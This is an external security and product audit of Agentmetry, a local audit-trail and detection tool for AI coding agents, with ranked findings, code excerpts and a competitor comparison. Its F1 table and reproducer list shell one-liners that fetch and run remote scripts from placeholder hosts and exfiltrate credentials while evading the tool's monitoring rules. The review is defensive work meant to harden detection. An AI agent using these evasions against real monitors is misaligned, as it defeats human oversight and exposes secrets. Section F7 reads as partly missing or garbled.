# Agentmetry: end-to-end audit — 2026-08-05

Auditor: external review, one solo developer's repo, no team assumed.
Head: `4eb7ea1` (248 commits total, 189 in the last 30 days).

---

## Verdict

Agentmetry is a real, disciplined, mostly honest audit trail for AI coding agents. The chain code, the disposition module, the dogfood gate, and the test suite are the work of someone who has thought carefully about what a recorder must not lose. The product is credible enough that a security engineer at a small EU consultancy would install it, keep it, and know why they had.

It is also **a recorder whose flagship "sequence detection" story is thinner than the marketing implies.** The detection engine is a regex-plus-tool-name classifier standing on two thin legs: a MITRE mapper that only fires credential-access on filename patterns, and a trait classifier that catches shell one-liners but nothing else. A five-minute list of evasions dodges the flagship rules cleanly, and six of fifteen rules have never been proved on any recorded session. The benchmark's benign half — the number the README correctly says matters most — is six sessions. That is not a false-positive rate. That is an anecdote.

**Continue.** The wedge (local-first, on the tool-call, replayable by a stranger) is real and unclaimed by the peers named later. **Do not pivot.** But narrow the product's claims to what the code demonstrably does, and spend the next month on the benign corpus, one commercially uncomfortable evasion class, and the first paying pilot. Anything else is procrastination.

**The one thing to do next:** file `LANDING-FIX` and ship it today — the agentmetry.ai landing page says the license is MIT (it's Apache-2.0), tags `cat .env` as T1003 (it's T1552), and stages the DLP default as `block` (it's `log`). Every finding below is downstream of that kind of gap between what the code does and what the copy claims.

## Findings, ranked by consequence

### F1 — Detection engine has systematic evasion holes the corpus was never asked to close

**Consequence: the marketing centrepiece.** "Your agent reads a private key, then makes a network call. Agentmetry sees the sequence" — I broke that story in five minutes on a probe of `get_mitre_mapping` and `classify_command` (`apps/orchestrator/agentmetry/core/audit/mitre.py:162`, `apps/orchestrator/agentmetry/core/audit/detection/traits.py:265`). Each of these evasions is a shell one-liner an attacker or an ADI-hijacked agent already writes:

| Attack shape | Classified as | Why it evades |
|---|---|---|
| `echo $AWS_SECRET_ACCESS_KEY` | `TA0002 Execution` only | `mitre.py` fires T1552 on filename patterns (`.aws/credentials`, `.ssh/`, `.env`, ...); env variables are invisible. So `credential-exfil` cannot fire on env-based secrets, which is the modal shape in cloud CI. |
| `gh secret list --repo owner/repo` | `TA0002 Execution` only | Same reason. The most obvious ADI cred-exfil path against a GitHub-integrated agent. |
| `python -c 'urllib.request.urlopen(...)'` | `TA0002 Execution` only | `_NETWORK_CLIENT` regex covers curl/wget/iwr/scp/rsync/ftp/telnet. No `python`/`node`/`ruby`/`perl`. So a python-based exfil channel earns no T1071.001 and `credential-exfil` cannot fire. |
| `bash <(curl -s https://ext.example.com/y.sh)` | C2 via URL, but **no** `pipe_to_shell` / `risky_exec` trait | `PIPE_TO_SHELL` regex demands `curl … | sh`. Process substitution goes right past it. `encoded-command-download` misses. |
| `curl -o /tmp/y.sh https://ghost.example.com/y && chmod +x /tmp/y.sh && /tmp/y.sh` | C2, but **no** `staging_fetch` trait | `STAGING_HOST` is githubusercontent/gist/HF/pastebin/gitlab/bitbucket only. Any other domain misses `remote-staging-then-execute`. |
| Any deletion burst of 4 (threshold is 5) | Nothing | `destructive-delete-burst` is a bare count. Split a `rm -rf` sweep across two sessions and both fall under the threshold. Only subagent bursts are host-aggregated. |
| Any credential read → git push where the *read* was env-var based | `git_exfil` trait fires on the push, but `dotfile-read-then-git-push` needs T1552 first. | The rule is guarded by `_is_credential_access`, which is `T1552.*` on `_technique_id`. See table row one. |

Reproducer (delete after review):

```python
from agentmetry.core.audit.mitre import get_mitre_mapping
from agentmetry.core.audit.detection.traits import classify_command
print(get_mitre_mapping("Bash", "echo $AWS_SECRET_ACCESS_KEY"))
# {'tactic_id': 'TA0002', 'tactic': 'Execution', ...}
print(classify_command("bash <(curl -s https://ext.example.com/y.sh)"))
# [] — no traits at all
```

**Neither of the two known false positives filed (#40, #41) is in this class.** The class the corpus was never asked to close is *false negatives on realistic evasions*. It exists because the benchmark grew from real dogfood sessions (a good instinct) and got no adversarial pen-tests. This is the finding I would fix before adding another rule.

**Falsifiable signal I was wrong:** run each of the six shell shapes above through `agentmetry_ingest.py` against a live orchestrator, watch the detection pane, and count how many fire. My prediction is at most one.

### F2 — Six of fifteen built-in rules have zero benchmark coverage, and the benign FP rate is a six-session anecdote

`benchmark.rules_covered = {approval-denied-then-executed, credential-exfil, credential-read-then-cloud-api, destructive-delete-burst, discovery-then-collect, dotfile-read-then-git-push, encoded-command-download, pr-merged-without-review, remote-staging-then-execute}` — 9 rules.

**Not covered:** `autonomous-unapproved-write`, `host-subagent-swarm-burst`, `off-hours-activity`, `session-tool-burst`, `subagent-swarm-burst`, `untrusted-input-then-risky-action`. Confirmed against `BUILTIN_RULE_IDS` in `rules.py:1129`. Issue #36 tracks it correctly but calls it "help wanted" — this is P0, not a good-first-issue.

The false-positive claim is **0 FPs in 6 benign sessions**. The 95% confidence interval on that is roughly `0% – 46%` (Rule of Three: upper bound ≈ 3/n = 50%). The README's own line — "The benign half is the number that matters" — is exactly right, and the number is not yet a number. State the CI, or grow the benign half to 30+ sessions before quoting rates at strangers.

**Falsifiable signal:** wire the corpus loader into `hypothesis`-generated benign sessions and watch how many rules fire on plausible normal work. My prediction: `destructive-delete-burst` and `subagent-swarm-burst` will fire on real cleanup and real parallel test runs at least once each.

### F3 — MITRE mapper is a classifier that must agree with the traits classifier, and the rules quietly trust the wrong one

Take `_is_credential_access` in `rules.py:248`: it checks `_technique_id(e).startswith("T1552")`. That is the MITRE mapper's output. The trait classifier has no `credential_read` label at all — it computes `git_exfil`, `cloud_api`, `pipe_to_shell` and eleven others. So a session whose command text was hashed away (the default privacy config) can:

- Have a `cloud_api` trait but no T1552 → `credential-read-then-cloud-api` cannot fire.
- Have a `git_exfil` trait but no T1552 → `dotfile-read-then-git-push` cannot fire.
- Have any of the ADI risky techniques the traits classifier does not label → `untrusted-input-then-risky-action` cannot fire.

That the two classifiers disagree is normal; that the rules only ask one of them, and the more brittle one, is the finding. In the default privacy configuration this drops the rule engine's recall further than the README implies.

**Falsifiable signal:** grep the rules for `_is_credential_access` and `_technique_id`, then replay a real week of dogfood with `AGENTMETRY_LOG_COMMANDS=0`. My prediction: `credential-read-then-cloud-api` and `dotfile-read-then-git-push` fire never in that week.

### F4 — Hook client blocks the IDE for up to 10 seconds

`scripts/agentmetry_ingest.py:399`:

```python
with urllib.request.urlopen(req, timeout=10) as response:
```

Every tool call from every wired-in IDE holds a synchronous HTTP POST for up to ten seconds waiting on the orchestrator. `URLError` fails open (spooled), but a *slow* orchestrator (DB backfill, drain, a stuck sink) stalls the agent's tool loop. In the CI-friendly single-writer case this is invisible; on the day someone's Elastic sink hangs, every Cursor command hangs for 10s. Also: `_read_repo_env` (line 169) opens `apps/orchestrator/.env` on every call to resolve `AGENTMETRY_LOG_COMMANDS`. That is disk I/O on the hot path.

The `fail-open` design is honest. The 10-second timeout is not.

**Fix:** drop the ingest timeout to 500 ms, cache the env lookup for the process lifetime, and log a WARNING to stderr on the *first* spool per process (right now every spooled event prints). **Falsifiable signal:** wire `time.perf_counter` around `post_ingest` and record p99 latency during a live drain. My prediction: p99 exceeds 4s at least once in a busy session today.

### F5 — Concurrent chain writers will silently corrupt the trail

`apps/orchestrator/agentmetry/core/audit/trail_chain.py:126`:

```python
def append_chained_line(trail_path, event):
    head = load_chain_head(trail_path)
    next_seq = head.seq + 1
    envelope = wrap_chained_record(next_seq, head.last_sha256, event)
    …
    with trail_path.open("a", encoding="utf-8") as fh:
        fh.write(line)
    _save_sidecar(chain_sidecar_path(trail_path), new_head)
```

There is no file lock. The only guard is `sinks.py:18` — `_file_lock = Lock()` — a per-process `threading.Lock`. That protects the single-process orchestrator. It does not protect against:

- Two orchestrator instances (a stray `uvicorn --workers 2`, an operator who ran `agentmetry serve` twice).
- Anything else on the machine that ever calls `append_chained_line` directly (nothing does today, but the function is public).

The failure mode is not "one line lost". It is two lines with the same `seq` and the same `prev_sha256`, and `verify_trail_file` will refuse the whole trail from that point onwards, then the operator learns their audit history became evidence a lawyer cannot use. **The chain has to be right or it should not be there.**

**Fix:** wrap the append+sidecar in an `fcntl.flock` / `msvcrt.locking` on a lockfile beside `audit-forward.jsonl.chain`. This is a two-hour job with a test that spawns two subprocesses. **Falsifiable signal I was wrong:** attempt to reproduce this by starting two orchestrator processes against the same `data/` dir, run the demo emitter, and `agentmetry verify --trail`. My prediction: fails within a minute.

### F6 — Product's own security posture: local-first, but not multi-user hardened

Facts, from the code and the observed install:

- `require_api_key` in `core/auth.py:29`: **"Skip auth when `AGENTMETRY_API_KEY` is unset"**. The doctor prints `[OK] API bound to 127.0.0.1 - loopback only (no API key needed)`, which is true and honest for a single-user Windows box.
- CORS regex (`api/main.py:170`): `http://(localhost|127\.0\.0\.1):\d+`. Any local browser page on any local port can hit the API. On a shared workstation, or a machine running any locally-hosted web tool (Jupyter, a Streamlit demo, a game dev preview server), the audit trail is readable without auth via a fetch from that page. **DNS-rebinding risk** on a laptop that ever visits an attacker-controlled site while the orchestrator is up.
- `data/audit-forward.jsonl` and its `.chain` sidecar are written with default umask. On a shared multi-user host every logged-in user can read the trail, including the SIEM API keys forwarded through it as part of the audit body (they aren't stored, but connection URLs, `fleet_id`, `operator_id` and the argument-hash truffleshuffle are all there).
- The Antigravity transcript watcher is spawned as an unmonitored subprocess (`api/main.py:135`) with `stdout=DEVNULL, stderr=DEVNULL`. If it dies, nothing knows.

Issue #34 (chain has no external anchor) and #33 (fleet trail records claims not facts) already capture two of these correctly. What is not filed:

- Bind CORS to `127.0.0.1:3000` explicitly (drop the regex).
- `chmod 0600` the trail/sidecar/`.env` on write and warn in `doctor` when they aren't. Non-trivial on Windows (needs `icacls`); fine to ship the check first and the auto-fix second.
- Supervise the transcript watcher or move it into the orchestrator process.
- Change `[OK] API bound to 127.0.0.1 - loopback only (no API key needed)` to a `[WARN]` on machines with more than one interactive user account.

### F7 — Landing page contradicts the repo and the code

`apps/landing/src/App.tsx`:

This is a material misrepresentation — a lawyer for a downstream company would refuse to ship until the site is fixed, and if they inherited it under the wrong terms they have grounds to complain. **Fix today.**

Every operator who installs and asks "why did nothing block" is a burnt user.

- Line 90–98: `Trusted by the Open Source Community — Featured on the biggest AI and Security Awesome Lists` with three unlinked, unattributed "Awesome …" badges. Public alpha with roughly 250 commits does not have social proof yet; pretending it does costs credibility with the exact security engineer this product is trying to reach.

The README trained me to expect the copy to say what the code does. The landing page did the opposite. **This is the single biggest gap between what the code does and what the site claims, and it is fixed in an afternoon.**

### F8 — The dogfood gate is deliberately painful, and the gate itself has never been passed

`agentmetry dogfood` today: **0 of 4 consecutive green weeks**. Week 1 in progress (3 active days). The gate started on 2026-08-03; the version tag says `agentmetry 0.4.0` released 2026-08-02 (three commits before `4eb7ea1`).

The gate design is sound: whole-file fingerprint of `rules.py + traits.py + engine.py + mitre.py + policies/detection/manifest.yaml`, so *any* rule change resets the clock. That is discipline the maintainer intentionally imposes on themselves. It has also never survived a single week: the git log shows detection code changing 6 times in the last 30 days.

For a solo alpha this is the right constraint; for the beta claim it is a claim the product cannot back yet. Either say **"beta gate not passed"** on the landing page next to the "public alpha" badge, or move the gate to "no rule change **during** the four weeks", so the fingerprint is checked at start and end of the run rather than continuously.

I would keep the gate. It is one of two mechanisms in the codebase (with the disposition trail) that will resist the future contributor who wants to ship a rule change on a Friday.

### F9 — Tests are unusually good at pinning behaviour; two systematic gaps

Read `test_trail_chain.py`, `test_readme_claims.py`, `test_dogfood_freeze.py`, `test_detection_disposition.py`. Each explains *why* it exists. `test_readme_claims.py` extracts the corpus size from `load_corpus()` and asserts the number in the README matches it — that is the right shape for a public alpha with a moving target, and I have not seen it in any comparable audit tool.

**Gap A — no adversarial detection tests.** Every rule test builds an event stream and asserts a specific detection fires. None of them tries to *evade*. Adding a `test_detection_evasion.py` with the F1 shapes and asserting the current known-broken behaviour is one PR; converting each `xfail` to a fix is one more.

**Gap B — no concurrent-writer test on the chain.** `test_trail_chain.py` covers tamper, truncation, forge, missing sidecar. It does not spawn two threads that both call `append_chained_line`. F5 will stay latent until this test exists.

**One test I want to write and cannot cleanly:** the hook client tests (`test_agentmetry_ingest_client.py`) don't measure latency at all. F4 is silent because nobody looks.

## Product / concept

### Who installs this on day one and why

Not "a security engineer at an enterprise". They already have Splunk, they already have their own SDLC review, and they will not install a public-alpha tool a solo maintainer wrote. They will read the README and say "come back when it's beta".

The realistic day-one user is one of two:

1. **A consultant doing an EU AI Act readiness gig for a mid-market client.** They need a defensible record of "here is what the agents did between June and September", the trail is the deliverable, and they own the machine it runs on. This buyer already exists in the maintainer's dogfood context and is one of two he already sees. Ship for them.
2. **A DevSecOps engineer at a 20-100 person AI-product startup** whose founding engineer is running Claude Code in autonomous mode against production. This person will install Agentmetry the day *after* the first incident, not the day before. The product exists to be install-ready when that incident lands.

Both buyers install because there is *no other product* that puts an ATT&CK-tagged, hash-chained, per-tool-call JSONL on their local disk with a `verify` command. Falco does not know what a Claude tool call is. Langfuse is a hosted trace, not evidence. Teleport records terminals, not a Cursor `Edit`. That gap is real and durable **for as long as the IDE vendors do not fill it themselves.**

### The platform-vendor risk is the real one

The day Anthropic or Cursor ships a first-class audit-log export with MITRE tagging, Agentmetry loses its wedge on that IDE. Anthropic already ships hook APIs precisely because their enterprise buyers ask for this; the next step is native. Timeline estimate: 6–18 months for at least one of the two big providers. **This is F1 through F9's importance ranking multiplied by ten.** Agentmetry has that window to become the *cross-agent, cross-IDE* recorder that the vendor's native log won't cover, and to build a corpus and a detection story a vendor won't ship.

The way to survive that day is to be the tool that ingests *the vendor's log too* and normalises across every agent host. That means:

- Add ingest adapters for Anthropic/Cursor native audit logs when they land.
- Own the canonical schema (v1.1.0) and the ATT&CK mapping.
- Own the detection content and the Sigma export.

Do *not* survive by adding sandboxing or CASB features. Those are unwinnable races.

### The CASB gap is not fatal, but it costs deals

The README calls this out cleanly ("If your problem is unmanaged ChatGPT in the browser, you need network or endpoint policy, not a flight recorder"). Honest and correct. It also means the person with budget for security tools — the CISO who owns *all* agent risk in the org — will not buy Agentmetry as their agent security tool. They will buy Zenity or WitnessAI or Prompt Security and *add* Agentmetry as the recorder for the coding-agent surface, if at all.

That is fine. It just means the buyer is the security engineer who reports to the CISO, not the CISO. Price accordingly, and stop talking to CISOs.

### Docs alignment

- `README.md`: honest, dense, has the right shape. The "Coverage & Limitations" section is the reason a security engineer trusts the rest.
- `apps/orchestrator/README.md`: not present as a distinct file; the orchestrator's story is in the top-level README. Merge or write.
- `ROADMAP.md`: internal-consistent, misses three rules (see claim table above).
- `apps/landing/src/App.tsx`: see F7. Fixes required.
- No `docs/detection-rules.md` linked from the README. The README says `[Every rule, how ordered matching works, and the research behind it →](docs/detection-rules.md)` — check that file exists and matches the rules registry (I did not find it in the grep results; if it does not exist, the link is dead).

### The four-week dogfood gate

**Keep it.** Two reasons:

1. It is the only mechanism in the codebase that will refuse a rule change for the maintainer's own good. Every other quality control (tests, ruff, review) requires *someone else* to enforce. This one enforces itself.
2. The gate does not stop iteration; it stops declaring beta while iterating. That is precisely the discipline a solo alpha needs.

The counter-argument is that a solo maintainer needs iteration speed and blocking rules for four weeks kills the loop. The counter to that is: nothing about the gate blocks *shipping* rules. It only blocks *claiming beta* while rules are shipping. That is the right cost.

## Comparison to the field

I will be short. For each: does the comparison even make sense?

**Runtime detection (Falco, Wazuh/OSSEC, auditd, Sysmon).** Not a real comparison. Falco sees processes and syscalls; it does not know what a Claude tool call is or where the session boundary is. Agentmetry is upstream of Falco in the stack. If a buyer already runs Wazuh, forward Agentmetry canonical events to it and stop competing.

**Detection content (SigmaHQ, MITRE ATT&CK tooling).** Agentmetry ships four Sigma rules (`docs/integrations/sigma/`) and every canonical event carries ATT&CK ids. That is enough to plug into any Sigma-consuming SIEM, and it is more than the AI-agent security peers do today. **Do more of this.** The Sigma pack is under-marketed relative to how much a Splunk shop cares.

**LLM/agent observability (Langfuse, LangSmith, Arize Phoenix, OpenLLMetry/Traceloop, OpenTelemetry GenAI conventions).** These are trace platforms. They optimise for "what did my prompt cost and how did it decide", not for "what did the tool do to the host". They are not competitors, they are potential *downstream* sinks. **Ship an OTLP export.** The ROADMAP already has this at P1 for Phase 2. Move it up. It is one of the two integrations that will make a Datadog-shop security engineer keep Agentmetry running. The GenAI semantic conventions are stable enough to emit today; the mapping from canonical v1.1.0 to OTel GenAI spans is about a day of work.

**Should the trail *be* OTel GenAI spans instead of a bespoke schema?** No. Two reasons: the schema has to carry the hash chain, the disposition history, and the ATT&CK mapping, none of which are first-class in GenAI conventions; and the trail is the *legal record*, not the observability signal. Emit both. Trail is authoritative, OTel export is a subscriber.

**AI/agent security vendors (Invariant Labs, Lakera, Zenity, Prompt Security, WitnessAI, IR Scribe).** These are the real competitive set for the buyer with budget. All are closed source and hosted, all sell to the CISO. Agentmetry's differentiators against them:

- Open source (Apache-2.0), so the buyer can prove there is no data exfil to a vendor cloud.
- Runs on the developer machine, so the trail exists even for local-only agent runs the vendor's cloud never sees.
- MITRE-tagged sequences streaming as first-class events, not just prompt/response traces.

Against them Agentmetry *loses* on: browser-side coverage, org-wide policy console, enterprise SSO, breach-liability contracts. **Do not build any of these.** Sell to the security engineer under the CISO who has a different budget line and different needs.

IR Scribe (the "nearest direct competitor") is closed source: I cannot check the code from here, and I will not rank a product I have not read. The differentiator to lean on against them regardless of what they ship: **the trail is the legal record, not a UI on top of one you cannot inspect.** For an EU AI Act deployer that is not a talking point, it is the buying criterion.

**Secret scanning (gitleaks, TruffleHog).** Different product, and Agentmetry's DLP is not trying to compete. The 18-rule DLP is fine for the "block the obvious AWS key in a tool arg" case and honest about being regex-only. Do not add more DLP rules; if a buyer wants pre-commit secret scanning, they will use gitleaks. **Consider integrating gitleaks as an optional DLP backend** — one adapter, ~200 lines, big credibility win.

**Session recording (Teleport).** Teleport records terminals. Agentmetry records the *agent's* tool graph, which a shell recording cannot reconstruct because the agent decided the sequence, not the human. Not competitors. If the buyer already runs Teleport, forward canonical events to their audit stream.

### The two questions that matter

**Is there an existing project that does this well enough that Agentmetry has no reason to exist?** No. `mcp-audit` and `mcp-tap` cover the MCP transport only. LangSmith etc. cover LLM traces, not host-side tool effects. Every AI-agent security vendor is hosted and closed source. Falco is the wrong layer. The wedge is real.

**Is Agentmetry reinventing a wheel it should instead be a plugin to?** Partially. The ATT&CK-tagging + Sigma export is the wheel; be a first-class plugin to *every* SIEM instead of a competitor to any of them. That plumbing is already the ROADMAP direction. Continue.

## Part 4 — Opinion (labelled as such)

The rest of this section is opinion, not evidence.

**Is this worth building, scale of shut-it-down to this-is-a-category?** *Worth continuing, not yet a category.* The category will be "AI agent observability + audit + light detection" and it will be dominated by whoever ships the local + cross-vendor + open-source play well. Agentmetry has an 18-month window to be that thing. Two of the seven scorecard rows already point at "top of the open-source pile in this niche", which is a defensible place to sell from even if the category never becomes big.

**The single biggest thing that will kill it, fixable by one person?** Not one thing.

- The *literal* killer is a big-agent-vendor native audit log shipping first and the whole positioning being 12 months late. Not fixable by one person.
- The *proximate* killer is nobody outside the maintainer running it in month three because there is no design partner and no incident-driven pull. Fixable by one person: spend the next 30 days getting one paid pilot from the EU-consultancy line the ROADMAP already names. See the plan.

**Most over-engineered part relative to its value?** The disposition module (`disposition.py`) and its history-preserving `rebuild_from_trail`. It is beautiful code for a problem the current user base does not have — no one has yet triaged a finding across two rule renames on a real trail. Correct in principle, expensive in maintenance surface. Keep it, but do not add more state-machine features to it before there is a second operator using it.

Runner-up: two full storage backends (SQLite for the index, JSONL for the record, plus checkpointed SQLite for live detection, plus the SQLite disposition index) is more storage than a solo alpha needs. Would be simpler as JSONL + a rebuildable in-memory index.

**Most under-built part relative to its importance?** The detection content. Four Sigma rules and 9 corpus-covered detections against a "sequence detection engine" positioning is thin. Grow the corpus and the Sigma pack; that is the marketable artifact. Every hour spent on a new UI feature is an hour not spent on the thing the security engineer scans the README for.

**If I had to cut 40% of the codebase, what goes?**

- `apps/obsidian-plugin/` — not part of the audit story, orphan surface.
- `adapters/crewai/` and `adapters/opensre/` at ~200-400 LOC each — nobody is using them, they carry test overhead, they can be community-contributed later.
- `apps/orchestrator/agentmetry/core/bus/*` (event bus + outbox persister) if it exists only to feed the dashboard websocket. A REST poll every 3s is enough for a solo-alpha dashboard.
- Chinese-agent hooks (qwen/kimi/qoder/codebuddy) as production, keep as adapter contributions. They exist because the maintainer wanted to show cross-agent parity; today they are surface without a corpus case each.
- The `apps/orchestrator/tools/mcp_audit_proxy.py` if fewer than five outside users have wired it up. The IDE-hook path is the story; MCP proxy is a nice-to-have.
- Half the compliance docs. Keep AI Act deployer checklist. Prune ISO 42001 mapping and the SOC 2 template until a customer asks.

That is closer to 30% than 40%; the remaining 10% is code the maintainer will not want to delete and I am not close enough to the value curve to argue for.

**Is the four-week dogfood gate a good idea?** *Yes.* Argued in F8 above. The counter is real but the discipline it enforces is scarcer.
